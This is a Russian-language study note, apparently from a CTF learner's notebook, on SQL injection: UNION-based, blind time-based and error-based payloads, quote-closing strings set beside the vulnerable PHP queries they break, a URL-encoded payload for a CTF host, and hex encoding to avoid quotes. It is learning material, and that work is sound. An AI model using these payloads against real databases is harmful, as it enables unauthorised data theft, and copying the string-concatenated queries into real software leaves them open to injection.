материалы по SQL смотри в [[SQL]]
полезный сайт: https://sqlwiki.netspi.com/
утилита: [[SQLmap]]
## общий синтаксис:
-- знак комментария
/* * /  тоже знак комментария, им можно заменять пробелы
`SELECT column_name(s) FROM table1`  - запрос колонки _column_name(s)_ в таблице _table1_
`SELECT * FROM flag` - запрос всех столбцов таблицы flag
`SELECT * FROM flag UNION SELECT * FROM table1` - запрос всех столбцов таблицы _flag_ и всех столбцов таблицы _table1_. Важно чтобы кол-во столбцов было одинаковое в обоих таблицах.
`SELECT 0, flag, 1 FROM flag UNION SELECT * FROM table1` - если количество столбцов разное можно замеенить их в другой таблице на любые символы, например 0 и 1.
`SELECT flag FROM flag WHERE part = 0` - поиск по значению столбца (строка в столбце part должна быть нулем).
`SELECT * FROM products WHERE label LIKE '%a'` - поиск по значению столбца (в данном случае оно должно заканчиваться на а или А).
`SELECT * FROM information_schema.tables` - служебная схема таблиц
`SELECT group_concat(table_name) FROM information_schema.tables` - соединение всех строк столбца в одну большую строку
`SELECT * FROM flag JOIN (SELECT '1') AS a JOIN (SELECT '2') AS b` - добавление столбцой из других таблиц/ просто столбцов

### Blind injection:
`IF(SUBSTRING((SELECT flag FROM flag), 5, 1) = 's', SLEEP(5), null)` - если пятая буква строки в столбце flag совпадает с s, то страница будет грузиться 5 секунд, если нет - сразу загрузится.

### Error based injection:
`SELECT extractvalue(rand(),concat(0x3a,(SELECT flag FROM flag)))` -пытается распарсить как xml, но оно не может распарсится. Выплевывает ошибку, т. е. место в которой она произошла.


SQL иннекции также можно использовать вводя в http запрос на странице:
`http://kslweb1.spb.ctf.su/sqli/bypass3/product_id=1%20union%20select%20flag,%201,%201%20from%20flag`

Если нельзя использовать кавычки, можно переводить поле в hex. например: 
name = 'b548d45080b9d110' преобразовать в 
name like 0x62353438643435303830623964313130



### Примеры:
SELECT flag as label, 1 as description FROM flag - переименовали столбец flag в label на время запроса и добавили столбец description со значениями 1

|label|description|
|---|---|
|KSL{2d680e727363a66d9e661d3a3e8eb6bd}|1|


a' UNION SELECT flag, 0, 1 FROM flag; -- qwe
**Query:** `SELECT * FROM products WHERE label LIKE '%a' UNION SELECT flag, 0, 1 FROM flag; -- qwe%' OR description LIKE '%a' UNION SELECT flag, 0, 1 FROM flag; -- qwe%'` - закрыли кавычку, написали свою команду.


a" ' )) UNION SELECT 0, flag, 1 FROM flag; -- qwe
**Query:** `"SELECT * FROM products WHERE ((label LIKE '%" . $query . "%') OR (label REGEXP '" . $query . "')) OR ((description LIKE '%" . $query . "%') OR (description REGEXP '" . $query . "'))"`
закрыли предыдущую команду и написали свою.


dashashink@yandex.ru" ', (SELECT flag FROM flag WHERE part = 0)); -- q
**Query:** 
`"INSERT INTO messages (id, time, ip, name, email, message) VALUES ('0', NOW(), '" . $ip . "', '" . $name . "', '" . $email . "', '" . $message . "')"`


можно подбирать цифры в запросе:
```
$res = mysql_query("SELECT * FROM users WHERE login = '$login' AND password = '$password'");  
    if (mysql_num_rows($res) > 0) {      
	    $_SESSION['loggedIn'] = true;
	}
```
запрос:
`12' AND 1=2 UNION SELECT flag, 1, 2 FROM flag WHERE flag LIKE '6908819' -- q`

можно найти имя нужной таблицы в базе таблиц:
`$res = debug_mysql_query("SELECT (" . $_GET['equ'] . ")");`
запрос:
`(SELECT group_concat(table_name) FROM information_schema.tables)`

